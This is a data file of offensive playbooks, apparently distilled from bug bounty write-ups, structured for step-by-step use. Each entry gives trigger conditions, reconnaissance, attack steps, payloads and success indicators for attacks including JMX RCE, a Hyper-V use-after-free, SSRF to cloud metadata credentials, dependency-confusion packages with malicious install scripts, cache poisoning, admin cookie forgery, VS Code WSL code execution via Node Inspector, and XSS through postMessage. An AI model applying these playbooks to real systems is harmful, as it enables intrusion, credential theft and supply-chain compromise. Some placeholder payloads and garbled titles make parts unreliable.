JMX service banners indicating vulnerability.
skip_if: JMX service is not exposed to the internet.
JMX service is properly secured with authentication.
WAF or network firewall blocks JMX traffic.

recon_steps: Step 1: Identify Google Cloud Dataflow worker nodes in the target environment. This can be done by observing network traffic or scanning ranges of Google Cloud IP addresses.
Step 2: Perform port scanning on identified worker nodes to discover open JMX ports. Common JMX ports include 9010, 7010, 8010, and 1099.
Step 3: Analyze the banner or response from the JMX service to confirm it is Java JMX and to identify potential version information or configuration details.
attack_steps: Step 1: Connect to the exposed JMX endpoint on a Dataflow worker node.
Step 2: Utilize JMX Remote Method Invocation (RMI) to interact with the Java management features.
Step 3: If the JMX service is vulnerable, leverage it to execute arbitrary Java code on the worker node. This often involves finding a specific MBean or method that allows command execution.
Step 4: Achieve remote code execution as root within an unprivileged container on the target Dataflow node.
payloads_or_patterns: JMX connection strings to target JMX endpoints.
Java payloads designed to exploit specific JMX vulnerabilities for RCE (e.g., using tools like `jmxterm` or custom scripts to invoke vulnerable MBeans).
tools_recommended: Nmap: For port scanning and service version detection.
jmxterm: A command-line tool for interacting with JMX agents.
Custom Java code: To leverage specific vulnerable JMX interfaces for RCE.
success_indicators: Execution of arbitrary commands on the Dataflow worker node.
Ability to read sensitive files on the worker node (e.g., `/etc/passwd`).
Callback received from a reverse shell established on the worker node.
failure_indicators: Connection refused or timeout when connecting to JMX ports: JMX is not exposed or accessible. Pivot to other Dataflow components.
Authentication required for JMX: JMX is secured. No RCE via this vector.
No vulnerable MBeans found or exploitable methods identified: Re-evaluate target JMX service for other potential weaknesses or move to a different attack vector.

playbooks.impact: Remote code execution as root on a Google Cloud Dataflow worker node. This could lead to compromise of the worker, access to sensitive data processed by Dataflow jobs, or further pivoting within the Google Cloud environment.
playbooks.key_lesson: Always investigate exposed management interfaces like JMX on cloud worker nodes, as they can provide unauthenticated access vectors for remote code execution.

meta.title: Bi/ug Bounties and HyperV RCE Research

trigger_conditions.when_to_apply: This technique is applicable when the target system's SMB service (specifically vmusrv.dll in Hyper-V) handles cancel or flush operations for file sharing and exhibits a race condition between ChangeNotify and asynchronous Cancel packets.
prerequisites: The target system must be running Microsoft Hyper-V.
Attacker must be able to send SMB2 packets to the Hyper-V host or a VM with vulnerable SMB configuration.
applicability_signals: Presence of functions like Smb2ExecuteCancel, Smb2CleanupWorkItem, Smb2ValidateCancel in vmusrv.dll.
Analysis of code coverage reports showing uncovered code blocks related to packet handling.
Vulnerability in the reference counting mechanism for work items.
Race condition between ChangeNotify and async Cancel packets.
skip_if: The SMB service is not vulnerable to the described race condition.
Proper synchronization and async flag handling prevents the race condition.

recon_steps: Step 1: Identify the target Hyper-V host or a vulnerable guest VM's SMB service.
Step 2: Analyze the vmusrv.dll binary for functions related to packet cancellation, cleanup, and validation (e.g., Smb2ExecuteCancel, Smb2CleanupWorkItem, Smb2ValidateCancel).
Step 3: Examine the reference counting and locking mechanisms around work items to detect potential UAF (Use-After-Free) vulnerabilities.
attack_steps: Step 1: Craft and send a ChangeNotify packet to trigger object deletion logic.
Step 2: Immediately after, send an asynchronous Cancel packet with a specific flag that triggers the race condition.
Step 3: The goal is to cause the Cancel packet to dereference a freed work item, leading to a crash or controlled execution (RCE).
payloads_or_patterns: Custom crafted SMB2 packets targeting Smb2ValidateCancel with specific flags to exploit the async cancel functionality and race with ChangeNotify.
tools_recommended: Custom SMB packet crafting tools (e.g., Scapy with SMB dissectors).
Debuggers (e.g., WinDbg) for analyzing crashes and UAF.
Fuzzing frameworks to automate packet generation and testing.
success_indicators: A crash (e.g., Blue Screen of Death) on the Hyper-V host or VM.
Observable code execution by the attacker.
Specific error messages indicating a Use-After-Free condition.
failure_indicators: No crash or exploitable behavior observed.
The system handles the concurrent packets without issue.
WAF or IDS blocks the crafted SMB packets. - Suggestion: Try fuzzing other SMB operations or different parts of vmusrv.dll.

playbooks.impact: Remote Code Execution (RCE) on the Microsoft Hyper-V host or a guest virtual machine, allowing an attacker to compromise the virtualization infrastructure and potentially all hosted virtual machines.
playbooks.key_lesson: Always fuzz packet processing logic, especially cancel, flush, and remove operations, as they often contain subtle race conditions and reference counting bugs.

meta.title: Turning bad SSRF to good SSRF: Websphere Portal

tech_stack_fingerprints: WebSphere Portal is an enterprise software used to build and manage web portals.

trigger_conditions.when_to_apply: When a server-side request forgery (SSRF) vulnerability exists that can be chained with a redirect gadget to reach arbitrary URLs.
prerequisites: The target application exhibits a restrictive SSRF that prevents direct access to arbitrary URLs.
There is a known or discoverable redirect gadget (an endpoint that allows redirection to an arbitrary URL).
applicability_signals: The SSRF mechanism accepts URL parameters.
The SSRF mechanism does not explicitly block internal IP addresses or sensitive internal endpoints, but certain payloads are still restricted.
The application uses Lotus Domino or a similar component that might have redirect functionalities.
skip_if: The SSRF vulnerability is already allowing access to arbitrary internal resources without needing a redirect gadget.
No redirect gadgets can be found or exploited in conjunction with the SSRF.

recon_steps: Step 1: Identify an existing SSRF vulnerability in WebSphere Portal.
Step 2: Analyze the HTTP client being used by the SSRF to understand its capabilities, specifically if it follows redirects.

Step 3: Discover a redirect gadget. The writeup mentions Lotus Domino as a potential source for such gadgets, implying a need to identify endpoints within WebSphere Portal or its integrated components that handle URL redirects.
Step 4: Test for variants of the SSRF that might be more or less restrictive.
attack_steps: Step 1: Craft an initial SSRF payload that attempts to reach the identified redirect gadget. This involves smuggling the redirect gadget within the original SSRF payload.
Step 2: Once the redirect gadget is successfully reached, use it to specify a new target URL, effectively chaining the SSRF to request an arbitrary resource.
Step 3: If the initial SSRF is restrictive, experiment with different ways to smuggle the redirect gadget payload to bypass restrictions.
Step 4: If XXE is also present, consider chaining it with SSRF for further exploitation.
tools_recommended: Burp Suite: To intercept and analyze HTTP requests, identify redirect gadgets, and craft complex SSRF payloads.
Web browser: For manual testing and verification.
success_indicators: The server successfully makes a request to the arbitrary target URL specified through the chained redirect gadget.
In cloud environments, successful retrieval of AWS Metadata service information (e.g., temporary credentials) if the arbitrary target URL points to the metadata endpoint.
failure_indicators: The SSRF payload fails to reach the redirect gadget, or the redirect gadget does not perform the intended redirection.
The SSRF still remains restrictive and does not allow access to arbitrary internal resources even after chaining.
The server returns an error or does not make the secondary request.

playbooks.impact: Allows an attacker to bypass SSRF restrictions and access arbitrary internal or external resources, potentially leading to the retrieval of sensitive information (e.g., AWS credentials), internal network reconnaissance, or further exploitation of internal services.
playbooks.key_lesson: When encountering restrictive SSRF vulnerabilities, investigate the possibility of chaining them with redirect mechanisms or other vulnerabilities (like XXE) to achieve full SSRF capabilities.

meta.title: How I Saved Christmas for Google 🎄

trigger_conditions.when_to_apply: When an organization uses a private package registry alongside public registries, and internally pulls packages by name without fully qualifying their source. This allows for dependency confusion attacks.
prerequisites: The target organization must use a private package repository that pulls from public repositories (like PyPI, npm, RubyGems) without strict naming or version resolution.
The attacker must be able to publish packages to public repositories.
applicability_signals: Organization utilizes internal build systems that fetch dependencies from both private and public package managers.
Internal packages might have names that clash with popular public packages.
skip_if: The organization strictly namespaces all internal packages or uses a private registry that exclusively serves its own packages without syncing from public sources.
Build systems have robust validation or pinning of dependency sources.

recon_steps: Step 1: Identify internal package names used by the target organization through leaked documentation, code, or observation of build processes.
Step 2: Research if any internal package names conflict with public package names on registries like PyPI, npm, or RubyGems.
Step 3: Determine the versioning strategy for internal packages. Identify if newer versions of packages are automatically pulled.
attack_steps: Step 1: Create a malicious package with the same name as a targeted internal package but with a higher version number. Publish this package to a public registry (e.g., PyPI).
Step 2: Observe the target's build or deployment pipelines. The build system, if configured to prefer newer versions and pull from public registries, will download the attacker's malicious package.
Step 3: The malicious package executes its payload during the installation or build process on the target's infrastructure, potentially leading to RCE.
payloads_or_patterns: Setup.py for Python: `setup(name='<internal_package_name>', version='<higher_version_number>', packages=['.'], ...)`. Malicious code would be in a file that gets installed.
Package.json for npm: `{"name": "<internal_package_name>", "version": "<higher_version_number>", ...}`. Malicious code could be in post-install scripts.
Gemfile for Ruby Gems: `spec.name = '<internal_package_name>'; spec.version = '<higher_version_number>'`. Malicious code in the gem's files.
tools_recommended: Burp Suite: To intercept and analyze network traffic during build processes if possible, or to monitor for callbacks.
Public package registry CLIs (pip, npm, gem): To publish the malicious package.
Custom scripts: To automate the creation and publishing of packages with incrementing version numbers.
success_indicators: Callbacks to an attacker-controlled server (e.g., Burp Collaborator, custom listener) originating from the target's network during the build process.
Successful execution of commands on the target's build server, observable through reverse shells or file system changes.
Modified build artifacts or deployed applications containing malicious code.
failure_indicators: Build process fails with 'package not found' errors, indicating the private registry is not being searched or the public registry is blocked.
Build process successfully resolves to the legitimate internal package, indicating version preference or source pinning is in place.
WAF or security controls prevent the malicious package from being downloaded or executed.

playbooks.impact: Remote Code Execution (RCE) on the build infrastructure, leading to potential compromise of sensitive code, credentials, or further access into the organization's network. This could allow for data exfiltration, privilege escalation, or deployment of further malicious software.
playbooks.key_lesson: Always ensure that private package repositories are strictly configured to prevent accidental resolution of public packages with conflicting names, especially by using fully qualified names or pinning specific sources for internal dependencies.

meta.title: Cache Poisoning at Scale

target_profile.technology: Web caching infrastructure (e.g., Varnish, Cloudflare, Apache Traffic Server, Fastly, CDNs)
affected_components: HTTP request parsing and cache key generation
tech_stack_fingerprints: Response headers from caching services (e.g., CF-Cache-Status, X-Cache)
Specific behavior with Host, URL fragment, or unkeyed headers

trigger_conditions.when_to_apply: When a web application uses a caching layer that does not correctly normalize or include all relevant HTTP request components (e.g., Host header casing, URL fragments, unkeyed headers) in its cache key, and a backend server responds differently to these variations.
prerequisites: Target uses a reverse proxy or CDN for caching.
Target's backend application exhibits different behavior based on variations in HTTP headers or URL components that the cache might ignore.
applicability_signals: Target uses Cloudflare, Fastly, Varnish, or Apache Traffic Server.
Responses to requests with varying 'Host' header casing (e.g., 'Example.com' vs 'example.com') differ.
Responses to requests with URL fragments ('#') result in unexpected behavior.
Responses to requests with specific unkeyed headers (e.g., 'X-Forwarded-Scheme') cause redirects or other variations.
skip_if: All cacheable responses are identical regardless of variations in Host header casing, URL fragments, or unkeyed headers.
The caching layer strictly enforces normalization of all relevant headers and URL components before generating a cache key.

recon_steps: Step 1: Identify target's caching infrastructure by analyzing HTTP response headers (e.g., 'CF-Cache-Status', 'X-Cache', 'Server').
Step 2: Send requests with variations in the 'Host' header casing to the same endpoint and observe if response bodies or status codes differ. Use a tool like Burp Suite to automate this.

Step 3: Send requests with URL fragments (e.g., `/<path>#<fragment>`) and observe if the fragment is forwarded by the proxy and if the backend handles it differently, or if the cache key generation ignores it.
Step 4: Identify and test unkeyed headers (headers not typically part of the cache key) by sending requests with custom unkeyed headers and observing backend responses.
attack_steps: Step 1: Identify an endpoint that returns cacheable content.

Step 2: Craft a request with a 'Host' header that differs in casing from the actual domain (e.g., `GET / HTTP/1.1
Host: <UPPERCASE_OR_MIXED_CASE_HOST>
...`).

Step 3: Observe the response. If the backend responds differently (e.g., with an error, a different page, or a redirect) when presented with the malformed 'Host' header, and the cache serves this poisoned response for the correct 'Host' header request, cache poisoning is achieved.

Step 4: For URL fragment poisoning, craft a request like `GET /path#<malicious_fragment> HTTP/1.1...`. If the cache key generator ignores the fragment, but the backend processes it to serve unexpected content (e.g., by encoding '#', allowing path traversal), this can lead to cache poisoning.

Step 5: For unkeyed headers, send a request with an unkeyed header that influences backend behavior (e.g., `X-Forwarded-Scheme: http`). If the cache serves this influenced response for requests without that header, cache poisoning occurs.
tools_recommended: Burp Suite (Repeater, Intruder): To systematically send requests with modified headers and URL components.
Curl: For manual testing and scripting.
Custom scripts: To automate scanning for variations in multiple targets.
success_indicators: Receiving a response for a request with a 'malicious' Host header, URL fragment, or unkeyed header, that is then served for subsequent legitimate requests with a 'correct' Host header, URL fragment, or absence of the unkeyed header.
Seeing a redirect or different content served from a cacheable URL after sending a specially crafted request.
Observing the caching service returning a 'HIT' for a poisoned object.
failure_indicators: All requests, regardless of Host header casing, URL fragments, or unkeyed headers, return identical responses from the cache.
Responses consistently show 'MISS' from the cache, indicating the variations are not being used to poison the cache.
The backend returns consistent error codes (e.g., 400, 403) for all variations, suggesting robust input validation before caching.

playbooks.impact: Cache poisoning can lead to various vulnerabilities including Cross-Site Scripting (XSS), Open Redirects, and in some cases, the serving of malicious content to all users who access a poisoned URL, impacting all unauthenticated users.
playbooks.key_lesson: Always test web caching layers for inconsistencies in how they generate cache keys, paying close attention to header casing, URL fragments, and unkeyed headers.

meta.title: MS Teams: 1 feature, 4 vulnerabilities

trigger_conditions.when_to_apply: When the link preview feature is enabled and processing URLs server-side.
prerequisites: An authenticated user account in Microsoft Teams.
applicability_signals: The presence of a link preview feature that processes URLs server-side.
The target endpoint `/urlp/v1/url/info` is accessible.
skip_if: The `/urlp/v1/url/info` endpoint is blocked or returns an error for all requests.
All outbound requests from the Teams server are strictly filtered and do not allow access to internal IPs or metadata services.

recon_steps: Identify the endpoint responsible for generating link previews.
Observe network traffic when a link is shared to see how previews are generated.
attack_steps: Step 1: Send a POST request to the `/urlp/v1/url/info` endpoint with a URL pointing to an internal service or the Azure Metadata service.
Step 2: Analyze the response for any leaked information, such as response times, content, or status codes, which can indicate the presence and accessibility of internal services.
tools_recommended: Burp Suite: To intercept and modify requests to the `/urlp/v1/url/info` endpoint.
Nmap (or similar port scanner): To test for open ports on internal IPs identified via SSRF.
success_indicators: A response containing information from an internal service (e.g., HTTP status codes, page content, Azure metadata).
Abnormal response times or content that indicates interaction with internal network services.
failure_indicators: Consistent 4xx or 5xx errors without any leaked information, suggesting URL filtering or a lack of accessible internal services.
No discernible difference in response for valid vs. invalid internal IPs, indicating the SSRF is restricted.

playbooks.impact: Access to internal Microsoft services, limited internal port scanning, ability to send HTTP-based exploits to discovered internal web services.
playbooks.key_lesson: Always test server-side URL processing endpoints for SSRF by attempting to access internal IP addresses and cloud provider metadata services.

meta.title: How I was able to bypass WAF and find the origin IP and a few sensitive files

tech_stack_fingerprints: Direct IP Access not allowed response

trigger_conditions.when_to_apply: When a target website is protected by Cloudflare WAF and the attacker wants to find the origin IP or access sensitive files directly.
prerequisites: Target is protected by Cloudflare WAF.
applicability_signals: nslookup returns Cloudflare IPs
Accessing target's IP directly results in 'Direct IP Access not allowed'
skip_if: Target does not appear to be protected by Cloudflare.

recon_steps: Step 1: Perform nslookup on target.com to identify resolved IPs.
Step 2: Observe that the resolved IPs are Cloudflare IPs and direct IP access is blocked.
attack_steps: Step 1: Use Shodan to search for the target domain or observed Cloudflare IPs in combination with specific file paths or search terms that might reveal sensitive information.
Step 2: Analyze Shodan search results for potential origin IP addresses or direct access to sensitive files.
payloads_or_patterns: Shodan search queries combining target domain/IPs with keywords like 'index of', 'admin', 'config', '.env', 'backup', etc.
tools_recommended: nslookup
Shodan
success_indicators: Shodan search results reveal a direct IP address for the target server.
Shodan search results show access to sensitive files or directories not protected by Cloudflare.
failure_indicators: Shodan search does not yield any unusual IPs or direct file access for the target.
All Shodan results also point to Cloudflare IPs or are inaccessible.

playbooks.impact: Bypassing WAF to find the origin IP allows for direct attacks on the server, bypassing WAF protections. Finding sensitive files can lead to direct data breaches or exposure of configuration details.
playbooks.key_lesson: Leverage external search engines like Shodan during reconnaissance to find origin IPs and bypass WAFs by searching for direct access to files or services.

meta.title: NotLegit: Azure App Service vulnerability exposed hundreds of source code repositories

trigger_conditions.when_to_apply: When a web application is deployed to Azure App Service using the 'Local Git' deployment method, and the application's programming language is PHP, Python, Ruby, or Node.js, as these do not process IIS's 'web.config' for access control.
prerequisites: Target application uses Azure App Service.
Application was deployed using 'Local Git' or experienced an 'inplace deployment' state after a file modification.
Application programming language is PHP, Python, Ruby, or Node.js.
applicability_signals: Presence of a *.azurewebsites.net domain.
Web server logs or responses indicating access to application files.
Absence of IIS-specific headers or configurations suggesting it's an ASP.NET application.
skip_if: The application is confirmed to be an ASP.NET application using IIS, as the 'web.config' mitigation would likely be effective.
Requests to /.git are consistently blocked by a WAF or result in 404 errors, suggesting the directory is not exposed.

recon_steps: Step 1: Identify Azure App Service deployments by looking for *.azurewebsites.net subdomains or infrastructure signals.
Step 2: Attempt to access /.git directory directly on the target domain: GET /.git
attack_steps: Step 1: Send a GET request to the root of the application with the path /.git appended: GET /.git
Step 2: If the /.git directory is accessible, attempt to list its contents by navigating into subdirectories like HEAD, refs, or objects.
Step 3: Download the entire .git repository to reconstruct the source code.
tools_recommended: curl: To manually fetch /.git and its contents.
git: To clone the repository if initial access is gained.
Burp Suite: To automate requests to /.git and its subdirectories.
success_indicators: A 200 OK response for GET /.git, and the presence of .git directory structure (e.g., HEAD, config files).
Ability to download repository files (e.g., commit history, source code).
Discovery of sensitive information within the .git repository.
failure_indicators: 404 Not Found or 403 Forbidden responses for /.git requests. Suggests the directory is not exposed or is properly secured.
The 'web.config' file is present and correctly configured (though the writeup mentions a typo making it ineffective for some languages). If it were effective, it would block access.
Successful access to /.git but no actual code or history files are present.

playbooks.impact: Exposure of the entire source code repository, including historical commits, developer information, credentials, and other sensitive data within the .git folder. This can lead to full application compromise and further attacks.
playbooks.key_lesson: Always ensure that the .git directory is not publicly accessible on web servers, especially for applications deployed using methods that might inadvertently expose it. Implement server-side access controls to prevent direct browsing of repository metadata.

meta.title: Blackbox Cookie Testing — How I Cracked The Admin’s Cookie

tech_stack_fingerprints: Cookie values with a specific encoding pattern (e.g., hex pairs separated by '00' which appear to represent character codes)

trigger_conditions.when_to_apply: When a web application's session cookie appears to encode user-identifying information and exhibits a pattern across different user accounts.
prerequisites: Ability to create multiple authenticated user accounts on the target application.
applicability_signals: Session cookies with a consistent, complex, and seemingly encoded structure.
A discernible pattern in session cookie values when creating multiple accounts with predictable usernames (e.g., test1, test2, or usernames with specific character repetitions).
skip_if: Session cookies are highly obfuscated or appear to be randomly generated and not tied to user creation.
The application uses secure, standard session management mechanisms that do not expose user identifiers within the cookie.

recon_steps: Step 1: Create multiple user accounts (e.g., 'test1', 'test2', 'test3'). Observe and record the session cookie for each account.

Step 2: Analyze the session cookies for any discernible patterns. Pay close attention to repeating hexadecimal sequences or character encodings that change predictably with username or account creation order.
attack_steps: Step 1: Identify the encoding scheme used for user identifiers within the cookie. The writeup suggests a pattern where '6100' might represent 'a', '6400' for 'd', etc., indicating a UTF-16 like encoding with a null byte separator.
Step 2: Determine the specific character codes for 'admin' based on the observed pattern (e.g., 'a' = 6100, 'd' = 6400, 'm' = 6D00, 'i' = 6900, 'n' = 6E00).
Step 3: Take a session cookie from a regular user account (e.g., 'test1').
Step 4: Modify the cookie by replacing the user identifier part with the determined 'admin' character codes. Also, observe any prefix changes (e.g., '0102' to '0100') that might be required.
Step 5: Re-submit the request with the modified cookie and observe the response.
tools_recommended: Burp Suite: To intercept and modify HTTP requests, specifically the 'Cookie' header.
Custom script (e.g., Python): To automate the creation of multiple accounts and the analysis/manipulation of cookie strings.
success_indicators: Receiving an administrative interface or elevated privileges after submitting the modified cookie.
Accessing sensitive information or performing administrative actions not available to regular users.
failure_indicators: Receiving a 401 Unauthorized or 403 Forbidden error after submitting the modified cookie.
The application redirects to a login page or shows an error indicating an invalid session.
If modification leads to a generic error, try adjusting other parts of the cookie (like the prefix, e.g., 0102 to 0100) or padding the username encoding.

playbooks.impact: Full administrative control over the web application, including the ability to access all data, modify settings, and potentially upload malicious files (e.g., webshells).
playbooks.key_lesson: Always analyze session cookie structures for patterns, especially after creating multiple user accounts, as they may inadvertently encode sensitive user information.

meta.title: RCE in Visual Studio Code's Remote WSL for Fun and Negative Profit

target_profile.technology: Visual Studio Code Remote WSL extension

trigger_conditions.when_to_apply: When Visual Studio Code's Remote WSL extension is installed and running, and the local WebSocket server it uses is accessible from an external network or a malicious local web page.
prerequisites: Visual Studio Code with the Remote WSL extension installed and active.
The VS Code Server's WebSocket connection must be reachable.
A mechanism to send network requests to the target machine (e.g., a local web page, another process).
applicability_signals: Visual Studio Code Remote WSL extension is running.
The VS Code Server's WebSocket is listening on an accessible interface (not strictly localhost if external access is possible).
The Node Inspector is spawned and accessible.
skip_if: The VS Code Server's WebSocket connection is firewalled and inaccessible.
The Node Inspector is not enabled or not accessible.

recon_steps: Step 1: Identify if Visual Studio Code with the Remote WSL extension is running on the target system. This is typically a user-facing application and not easily detected passively.
Step 2: Attempt to identify the WebSocket server endpoint used by VS Code Server for remote development. The writeup implies it listens on a specific port and potentially all interfaces.
attack_steps: Step 1: Connect to the VS Code Server's WebSocket endpoint (e.g., ws://<TARGET_IP>:<PORT>/`). The writeup states it doesn't check the Origin header.
Step 2: Spawn a Node Inspector instance by sending a specific command over the WebSocket. This instance also listens on all interfaces.
Step 3: Connect to the spawned Node Inspector instance from an external application or a malicious web page.
Step 4: Utilize the Node Inspector to inject environment variables or execute arbitrary commands on the target system to achieve RCE.
payloads_or_patterns: WebSocket messages to control VS Code Server and Node Inspector. Specific payloads for spawning Node Inspector and executing commands would need to be reverse-engineered or found from the VS Code protocol documentation.
Command injection payloads to be executed via Node Inspector, e.g., `node -e 'require("child_process").execSync("calc.exe")'`
tools_recommended: Custom Python script or JavaScript to interact with WebSockets.
A tool to scan for open ports and services (e.g., nmap) to identify the WebSocket and Node Inspector ports if not known.
A local web server to host a malicious JavaScript payload that connects to the target's WebSocket/Node Inspector.
success_indicators: Successful execution of arbitrary commands on the target system (e.g., launching `calc.exe` as demonstrated in the writeup).
Receiving confirmation of command execution (e.g., network callbacks from the executed command).
failure_indicators: WebSocket connection refused or timed out (indicates the server is not running or is firewalled).
Node Inspector connection refused (indicates it was not spawned or is not accessible).
Commands executed do not produce the expected output or behavior (may indicate incorrect payload, environment, or protocol understanding).

playbooks.impact: Remote Code Execution (RCE) on the target system running Visual Studio Code with the Remote WSL extension. This allows an attacker to perform any action the user running VS Code has permissions for.
playbooks.key_lesson: Always check authentication and Origin headers for WebSocket connections, especially in client-server architectures where one component might be exposed unintentionally. Be wary of services that spawn debug instances (like Node Inspector) as these can be powerful attack vectors if exposed.

meta.title: Yes, fun browser extensions can have vulnerabilities too!

affected_components: Content script interacting with web pages
tech_stack_fingerprints: Extension ID (can be inferred from usage)

trigger_conditions.when_to_apply: When a browser extension injects content into web pages and uses `innerHTML` with user-controlled data without proper sanitization, especially if that data can be influenced by external websites.
prerequisites: The browser extension must be installed by the user.
The extension must inject content into web pages (not just the new tab page).
The extension must use `innerHTML` or a similar method to render dynamic content.
applicability_signals: Observing the extension injecting HTML into web pages.
Identifying messages or configuration values that are displayed directly in the page content.
The extension handling messages from external websites via `window.postMessage()` without origin checks.
skip_if: The extension only operates on the new tab page.
All dynamic content is rendered using textContent or other safe methods.
The extension does not interact with external websites or if it strictly validates message origins.

recon_steps: Inspect the browser extension's manifest.json to understand its permissions and content scripts.
Observe the extension's behavior on various websites to identify where and how it injects content.
Analyze the extension's JavaScript code (if accessible) for the use of `innerHTML` with dynamic data.
Examine how the extension handles messages from `window.postMessage()` by analyzing the event listener code.
attack_steps: Step 1: Identify a dynamic string rendered by the extension using `innerHTML`. The writeup mentions pet/owner names as examples.
Step 2: If the dynamic data can be influenced by external websites (via `window.postMessage` without origin checks), craft a malicious HTML page.
Step 3: On the malicious HTML page, use `window.postMessage()` to send a message to the extension that will ultimately set the vulnerable configuration value (e.g., pet name) to an XSS payload.
Step 4: Trigger the extension's rendering mechanism to display the malicious payload.
payloads_or_patterns: Directly manipulate `localStorage` if possible: `localStorage.setItem('petName', 'Meow')` (This is a hypothetical step based on the writeup's mention of `localStorage`).

Using `window.postMessage` to send the malicious data to the extension: `window.postMessage({ someConfigKey: 'Meow' }, '*')` (The exact message structure would need to be determined by analyzing the extension's code).
tools_recommended: Browser Developer Tools: Inspect elements, console logs, and network requests.
Burp Suite: To host the malicious HTML page and intercept/analyze communication.
Custom JavaScript: To craft `window.postMessage` payloads.
success_indicators: The injected JavaScript payload executes in the context of the user's browser.
Observable behavior in the browser, such as an alert box, redirect, or data exfiltration.
The writeup confirms a successful XSS exploit where an attacker can inject JavaScript code executing in the context of websites visited by the user.
failure_indicators: The payload is rendered as plain text and not interpreted as HTML.
The extension sanitizes the input before rendering.
The `window.postMessage` listener has strict origin checks that prevent messages from malicious websites.

The writeup mentions a limitation of 20 characters for pet/owner names in the UI, but notes that `localStorage` bypasses this. If `localStorage` manipulation is not possible, the payload size is a constraint.

playbooks.impact: An attacker can inject arbitrary JavaScript code into any website the user visits while the vulnerable extension is active. This can lead to session hijacking, data theft, credential phishing, or further compromise of the user's browsing session.
playbooks.key_lesson: Always validate the origin of messages received via `window.postMessage()` and sanitize any user-controlled data before rendering it using methods like `innerHTML`.

meta.title: Flickr Account Takeover

trigger_conditions.when_to_apply: When the target uses AWS Cognito for authentication and the authentication flow forwards tokens to the main application domain.
prerequisites: Attacker must have credentials for a Flickr account.
applicability_signals: Login flow redirects to identity.flickr.com and then to cognito-idp.us-east-1.amazonaws.com.
Cognito ID tokens or Access Tokens are observed in the response.
The target uses AWS Cognito for authentication.
skip_if: The login flow does not involve Cognito.
Cognito access tokens are not issued or are heavily restricted.
